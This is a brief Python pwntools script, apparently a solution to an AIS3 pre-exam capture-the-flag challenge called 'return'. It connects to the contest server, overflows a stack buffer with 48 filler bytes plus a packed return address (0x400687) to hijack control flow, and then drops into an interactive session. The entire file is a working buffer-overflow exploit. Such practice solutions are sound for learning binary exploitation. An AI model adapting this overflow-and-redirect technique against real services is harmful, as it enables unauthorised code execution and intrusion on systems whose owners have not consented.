#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = 'pre-exam-pwn.ais3.org'
prot = 10000
r = remote(ip, prot)
#r = process("./return")

r.recvuntil("ubuntu 18.04.")
r.sendline(b"A" * 48 + p64(0x400687))

r.interactive()
